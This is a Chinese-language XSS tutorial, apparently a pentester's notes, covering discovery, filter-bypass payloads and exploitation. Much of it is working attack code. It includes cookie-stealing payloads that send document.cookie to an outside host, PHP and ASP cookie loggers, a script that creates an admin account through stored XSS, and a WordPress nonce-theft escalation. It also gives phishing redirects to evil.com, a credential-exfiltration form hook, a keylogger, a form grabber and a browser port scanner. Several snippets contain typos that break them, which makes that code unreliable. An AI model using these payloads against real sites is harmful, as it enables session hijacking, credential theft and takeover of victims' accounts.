# xss漏洞

&nbsp;

## xss漏洞挖掘

### 【xss介绍】

* **什么是XSS**
  * XSS（cross-site script）跨站脚本自1996年诞生以来，一直被OWASP(open web application security project) 评为十大安全漏洞中的第二威胁漏洞。也有黑客把xss当做新型的“缓冲区溢出攻击”，而JavaScript是新型的shellcode。

* **XSS危害**
  * 网络钓鱼，包括盗取各类的用户账号
  * 窃取用户cookie
  * 窃取用户浏览请回话
  * 强制弹出广告页面、刷流量
  * 网页挂马
  * 提升用户权限，进一步渗透网站
  * 传播跨站脚本蠕虫等

* **Xss分类**
  * 反射型XSS（反射型跨站脚本也称作非持久型、参数型跨站脚本、这类型的脚本是最常见的 ，也是使用最为广泛的一种，主要用于将恶意的脚本附加到URL地址的参数中，http://www.cracer.com/search.php?key="><script>alert("xss")</script>一般使用的将构造好的URL发给受害者，是受害者点击触发，而且只执行一次，非持久化。）
  * DOM型xss（通过审查元素追踪触发代码的节点，通过闭合构造攻击语句）
  * 存储型XSS（此类XSS不需要用户点击特定的URL就能执行跨站脚本，攻击者事先讲恶意JavaScript代码上传或存储到漏洞服务器中，只要受害者浏览包含此恶意的代码的页面就会执行恶意代码。）

### 【XSS漏洞挖掘】

* **手动挖掘**
  * 我们得到一个站点http://www.cracer.com/xss.php?id=1
  * 攻击者会这样进行XSS 测试，将如下payloads 分别添加到id=1：可以测试用户输入地方、文件上传地方、flash等
  * 闭合标签
  ```html
  <script>alert(1)</script>，'"><script>alert(1)</script>，<img/src=@ onerror=alert(1)/>，'"><img/src=@ onerror=alert(1)/>
  ```
  在闭合标签的时候要注意闭合优先策略
  
  * 闭合优先的标签：这些标签都是闭合优先级高于双引号完整性优先级的特殊标签。
  ```html
  <!--，<iframe>，<noframes>，<noscript>，<script>，<style>，<textarea>，<title>，<xmp>
  ```

* **工具挖掘**
  * awvs
  * appscan
  * burp
  * xsser
  * xsscrapy
  * brutexssr
  * OWASP Xenotix

* **反射型XSS挖掘位置**
  * 注入点（url数据交互）
  * 搜索框

* **存储型XSS挖掘位置**
  * 用户注册所有提交表单
  * 修改资料的各种表单
  * 用户名，client-ip，x-forwarded-for，referrer，cookie
  * 留言板
  * 一切可能会留到数据库的表单都可以去尝试插xss

### 【XSS防御绕过】

* **标签闭合**
  * 盲闭合标签：
  ```html
  '"/></div></td></tr></textarea><script>alert(/xss/)</script>
  ```
  有时会导致页面排版错乱
  如果由长度限制，则可以一个一个试
  
* **改变大小写**
  * 在测试过程中，我们可以改变测试语句的大小写来绕过XSS规则
  * 比如：`<script>alert("xss");</script> 可以转换为：<ScRipt>ALeRt("XSS");</sCRipT>`

* **利用空格与回车绕过**
  * js语法中如果没有；结束，则解释器会继续往后读取语句，这样可以利用空格或者回车来绕过xss防御
  * `<img src="java script:alert(/xss/);">`

* **绕过 magic_quotes_gpc**
  * magic_quotes_gpc=ON是php中的安全设置，开启后会把一些特殊字符进行轮换，比如'(单引号)转换为\'，"(双引号)转换为\" ，\转换为\\
  * 针对开启了magic_quotes_gpc的网站，我们可以通过javascript中的String.fromCharCode方法来绕过，
  * String.fromCharCode(97, 108, 101, 114, 116, 40, 34, 88, 83, 83, 34, 41）String.fromCharCode()是javascript中的字符串方法，用来把ASCII转换为字符串。

* **XSS 尖括号过滤绕过**
  * 一般情况下如果输出没有显示在其他标签里，那么基本上是没有办法进行攻击的，但是如果是输出到其他标签里，则可以结合上下标签进行绕过
  * 常用的一些事件函数 `onerror`、`onmouseover`、`onload` 等（但是这里依然需要有 `<、>、=` 等符号，只能是在 `script` 才过滤）
  ```html
  <img src=x onerror=alert(/1/)>
  <p onmouseover=alert(/1/)>xxx</p>
  <frameset onload=alert(/1/)>
  <body onload=alert(/1/)>
  ```

* **XSS 括号过滤绕过**
  * 很多时候不仅仅是需要得到 `Cookie` 等，还需要传播（`XSS` 蠕虫）
  * 通过 `src` 引入外部文件，利用代码写在外部文件中（外部文件后缀可以不为 `.js`）也可以绕过长度限制
  * <script src='1.js'></script>

* **长度限制绕过**
  * 前端限制：修改html中的maxlength长度限制
  * 后端限制：极限缩短xss代码，使用短域名
  * 拆分跨站法绕过：如果长度限制很严格时，可以将上传的shellcode拆分为多个语句，赋值给一个变量，当全部语句写入网页后，使用eval函数执行变量中存储的shellcode，从而触发xss

* **Xss的编码绕过**
  * html实体编码：例如：&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x29;**html实体编码要编码标签内的内容，不能把标签编码，即编码完要满足两边要有标签**
  * 进制类：例如：\x61\x6c\x65\x72\x74\x60\x78\x73\x73\x60，某些时候，也有不带x,例如：\5c\6a
  * Unicode：例如：\u0061\u006c\u0065\u0072\u0074\u0060\u4e2d\u6587\u4e5f\u53ef\u4ee5\u0060
  * 纯转义：例如：\'   \"   \<   \> ,这样的在特殊字符前加\进行转义。

* **使用html标签属性执行xss绕过**
  * 很多html标签支持javascript:[code]伪协议形式
  * 例如：`<table background="javascript:alert(/xss/)"></table>`
  * `<img src="javascript:alert(/xss/);">`

* **利用html中事件绕过**
  * 如果对于`<script>`标签拦截的较死，可以试试利用html中的事件函数，click，mouseover，load等
  * 例子：`<input type="button" value="click me" onclick="alert(/xss/)" />`
  * `<img src="#" onerror="alert(/xss/)">`

* **利用css跨站绕过**
  * css样式表中执行javascript代码同样具有隐蔽性，但是缺点是各个浏览器之间不能通用
  * 例子：`<div style="background-image:url(javascript:alert(/xss/))"></div>`
  * IE5之后版本也可以使用css中的expression，例子：`<div style="width: expression(alert(/xss/));">`

### 【常见问题】

* 目标测试网站时https时，我们使用的xss平台也要使用https协议
* 当打入cookie时，发现访问页面空白或者404
  * 解决方法：跟换访问的页面，一般访问后台页面/admin/，/default/，/index.asp等等页面（原因是管理员删除了某些页面，或者修改了页面名称导致）
* 如果访问后台页面发现要输入waf二级密码
  * 解决方法：直接打入cookie访问后台页面，而不是访问后台登录页面

* 拿到cookie，但是无法登录后台
  * 解决方法：有可能是工具的原因
  * 一般asp站点使用马哥cookie欺骗工具
  * php站点，jsp站点，aspx站点使用cookie manager

* http-only启用时攻击
  * 找到后台登录地址，下载登录页面
  * 修改登录页面表单
  ```html
  <blockquote>                       <formrole="form"id="formLogin"action="/manage/user/login"method="post">
  ```
  被更改后的
  ```html
  <blockquote><formrole="form"id="formLogin"action="/index.php"method="post">
  ```
  
  * 创建index.php文件，用来接收提交的用户名密码保存到数据库，并调用原来的登录页面
  * 创建tz.php，加载目标网站
  * 需要一个公网可以访问到的ip或者域名，用来给管理员访问到
  * 插入构造好的调用网站地址到xss漏洞里面。
  ```html
  <script>window.location.href='http://www-baidu-com-adminlogin.ceshi.top/index.html';</script>
  ```
  

&nbsp;

## xss漏洞利用

### 【cookie盗用与利用】

* **cookie获取原理**
  需要在一个存在存储型xss或者反射型xss的网站写入盗取cookie的xss代码
  用户浏览网页就会被盗取cookie
  一般欺骗的是插入xss的网站的cookie
  
* **获取cookie的方法**
  * 方式1：
  ```js
  <script>documnet.location="http://www.test.com/cookie.asp?cookie='+documnet.cookie"
  </script>
  ```
  
  * 方式2：
  ```js
  <img src="http://www.test.com/cookie.asp?cookie='+document.cookie"></img>
  ```

  * 方式3：
  ```js
  <script>
  new Image().src="http://www.test.com/cookie.asp?cookie='+document.cookie" 
  </script>
  ```

  * 方式4：
  ```js
  <script> 
  document.write('<img src="http://www.test.com/cookie.asp?cookie='+document.cookie+'" width=0 height=0 border=0 />'); 
  </script>
  ```

* **接受cookie**
  * php版本：
  ```php
  <?php
  $cookie=$_GET('cookie');
  $log=fopen("cookie.txt","a");
  fwrite($log,$cookie ."\n");
  fclose($log);
  ?>
  ```
  
  * asp版本：
  ```asp
  <%
  msg=Request.ServerVariables("QUERY_STRING")
  testfile=Server.MapPath("cookie.txt")
  set fs=server.CreateObject("scripting.filesystemobject")
  set thisfile=fs.OpenTextFile(testfiel,8,true,0)
  thisfile.WriteLine(""&msg&"")
  thisfile.close
  set fs=nothing
  %>
  ```
  
### 【会话劫持】

* **xss实现权限提升**
  * 首先需要一个存储型xss漏洞，例如留言板等等
  * 如果管理员进入后台将会被劫持
  * 例如：利用xss漏洞添加一个管理员账号，需要截取添加管理员账号时的http请求信息
  * 使用xmlhttp对象在后台发送这个请求
  * xss shellcode：
  ```js
  var request=false;
  if(window.XMLHttpRequest){
  request=new XMLHttpRequest();
  if(request.overrideMimeType){
  request.overrideMimeType('text/xml');
  }
  }
  else if(window.ActiveXObject){
  var versions=['Microsoft.XMLHTTP','MSXML.XMLHTTP','Microsoft.XMLHTTP','Msxml2.XMLHTTP.7.0','Msxml2.XMLHTTP.6.0','Msxml2.XMLHTTP.5.0','Msxml2.XMLHTTP.4.0','MSXML2.XMLHTTP.3.0','MSXML2.XMLHTTP'];
  for(var i=0;i<versions.length;i++){
  try{
  request=new ActiveXObject(versions[i]);
  } catch(e){}
  }
  }
  xmlhttp=request;
  add_admin();
  function add_admin(){
  var url="............./abc.asp"    //请求地址
  var params="................."     //提交的数据（截取管理员提交的post数据）
  xmlhttp.open("POST",url,true);
  xmlhttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");
  xmlhttp.setRequestHeader("Content-length",params.length);
  xmlhttp.setRequestHeader("Connection","close");
  xmlhttp.send(params);
  }
  ```
  
* **wordpress中利用xss提权**
  * wordpress中含有nonce防护机制（每个http请求中包含nonce字段，防止csrf攻击）
  * 但是对于store xss，nonce并不起作用
  * 首先创建一个js函数，向创建用户url发送http请求，并且使用正则表达式找到nonce值
  * 拿到nonce值，则可以发送http请求创建一个拥有admin权限的用户
  * 上传jscode，防止坏字符
  首先将js代码改编为一行模式，使用网站：https://jscompress.com 工具
  
  * 使用encode函数加密js代码，防止发送过程中含有坏字符
  ```js
  function encode_to_javascript(string){
  var input=string
  var output="";
  for(pos=0;pos<input.length;pos++){
  output+=input.charCodeAt(pos);
  if(pos!=(input.length-1)){
  output+=","
  }
  }
  return output;
  }
  let encode=encode_to_javascript("js code")
  console.log(encode)
  ```
  
  * 将js代码转换为数字
  ```bash
  curl -i http://abc.com --user-agent "<script>eval(String.fromCharCode(....))</script>"
  ```
  
* **获取webshell**

  * 首先需要含有xss漏洞的网页
  * 上传一份图片码或者其他一句话木马
  * 当管理员触发后台xss漏洞时，会劫持管理员在后台备份数据库，其中一句话也被备份进去
  * 使用C2远控软件控制

### 【网路钓鱼】

* **钓鱼方式**
  * xss重定向钓鱼：
  将当前页面重定向到一个钓鱼网站，从而进行诈骗活动
  exploit：
  ```
  http://www.bug.com/index.php?search="'><script>document.location.href="http://www.evil.com"</script>
  ```
  
  * HTML注入钓鱼:
  直接利用xss漏洞将html/javascript代码注入到页面中
  exploit：
  ```html
  http://www.bug.com/index.php?search="'<html><head><title>login</title></head>
  <body><div style="test-align: cneter;"><form Method="POST" Action="phishing.php" Name="form"><br /><br />Login:<br /><input name="login" /><br />Password:<br /><input name="password" type="password" /><br /><br /><input name="Valid" value="ok" type="submit" /><br /></form></div></body></html>
  ```
  
  * XSS跨框架钓鱼：
  通过<iframe>标签嵌入一个远程页面实施钓鱼，页面依然会停留在当前域名下
  exploit：
  ```html
  http://www.bug.com/index.php?search='><iframe src="http://www.evil.com" height="100%" width="100%"></iframe>
  ```
  
* **XSS phishing**
  * 首先创建钓鱼页面，一般时网页登录页面，并且修改上传目标
  * 搭建记录信息的远程服务器，当输入账号密码时写入logfile.txt文件里，并且使用php的header()函数实现页面跳转
  * 最后写入xss代码，用户访问这个链接时，会远程加载xss.js文件，会创建一个iframe框架覆盖页面，要求用户输入账号密码，输入后返回正常页面
  * 账号密码会保存在logfile.txt中

* **高级钓鱼技术**
  * 直接读取用户账号密码（httponly使用）
  exploit：
  ```js
  <script>
  Form=document.forms["userslogin"];
  Form.onsubmit=function(){
  var iframe=document.createElement("iframe");
  iframe.style.display="none";
  alert(Form.user.value);
  iframe.src="http://127.0.0.1/phishing.php?user="+Form.user.value+"&pass="+Form.pass.value;
  document.body.appendChild(iframe);
  }
  </script>
  ```
  
  * 键盘记录器
  exploit：
  ```js
  <script>
  function keyDown(){
  var keycode=event.keyCode;
  var realkey=String.fromCharCode(event.keyCode);
  alert("按键码："+keycode+"字符："+realkey);
  }
  document.onkeydown=keyDown;
  </script>
  ```
  
  * 遍历form表单抓取重要字段值
  exploit：
  ```js
  function grabber(){
  F=document.forms;
  for(var j=0;j<F.length;++j){
  f=F[j];
  for(i=0;i<f.length;++i){
  if(f[i].type.toLowerCase()=="password"){
  alert("Password:"+f[i].value)
  }
  else if(f[i].type.toLowCase()!="submit"){
  alert("Text:"+f[i].value)
  }
  }
  }
  }
  ```
  
### 【客户端信息刺探】

* **javascript实现端口扫描**
  * 原理
  利用img.src属性，对远程服务器发送img请求，如果img属性onerror返回错误则端口开放，如果链接超时则端口关闭
  
  * exploit：
  ```js
  <form>
  <label for="target">target</label><br/>
  <input type="text" name="target" value="eg:www.baidu.com"><br/>
  <label for="port">port</label><br/>
  <label for="timeout">timeout</label><br/>
  <input type="text" name="timeout" value="1000"/><br/>
  <label for="result">result</label><br/>
  <textarea id="result" name="result" rows="7" cols="50"></textarea><br/>
  <input class="button" type="button" value="scan" onClick="javascript:scan(this.form)" />
  </form>
  
  <script>
  var AttackAPI={
     AttackAPI.PortScanner={}
     AttackAPI.PortScanner.scanPort=function(callback,target,port,timeout){
            var timeout=(timeout==null)?100:timeout;
            var img=new Image();
  
            img.onerror=function(){
                  if(!img) return;
                  img=undefined;
                  callback(target,port,'open');
            };
            
            img.onload=img.onerror;
            img.src='http://'+target+':'+port;
            setTimeout(function(){
                 if(!img) return;
                 img=undefined;
                 callback(target,port,'close');
            },timeout);
     };
     AttackAPI.PortScanner.scanTarget=function(callback,target,ports,timeout){
            for(index=0;index<ports.length;index++)
                 AttackAPI.PortScanner.scanPort(callback,target,ports[index],timeout);  
     };
  }
  </script>
  <script>
  var result=document.getElementById('result');
  var callback=function(target,port,status){
     result.value+=target+':'+port+' '+status+"\n";
  };
  var scan=function(form){
       AttackAPI.PortScanner.scannTarget(callback,form.target.value,form.port.value.split(','),form.timeout.value);
  };
  </script>
  ```
  
* **截获剪贴板内容**
  * 原理
  使用window.clipboardData对象处理剪贴板内容，主要有三个方法：clearData(sDataFormat)//删除剪贴板中指定格式数据，getData(sDataFormat)//从剪贴板中获取指定格式数据，setData(sDataFormat,sData)//给剪贴板赋予指定格式内容
  
  * exploit：
  ```js
  <form id="test" action="test.php" method="post">
  <div id="someData">
  <textarea row="4" cols="40" name="test">  </testarea>
  <input type="button" value="复制到剪贴板" onclick="setClipboard()">
  <input type="button" value="查看剪贴板内容" onclick="readClipboard()">
  <input type="button" value="清除" onclick="window.clipboardData.clearData('text');">
  </form>
  
  <script>
  function readClipboard(){
     alert(window.clipboardData.getData('Text'));
  }
  function setClipboard(){
     var t=document.getElementById("someData").innerText;
     window.clipboardData.setData('text',t);
  }
  </script>
  ```
  
* **获取客户端IP**
  * 方法一：可以使用ActiveXObject对象的属性GetIPAddress方法获取客户端ip，但是知识获取的是内网地址
  * 方法二：可以利用外网ip查询网站来获得客户端ip地址
  * exploit：
  ```js
  <script>
  xml=new ActiveXObject("Microsoft.XMLHTTP");
  xml.open("GET","http://www.ip138.com/ip2city.asp",false);
  xml.send();
  kk=xml.ResponseText;
  i=kk.indexOf("[");
  ie=kk.indexOf("]");
  ip=kk.substring(i+1,ie);
  document.write("ip地址为："+ip);
  </script>
  ```
  
  
  
  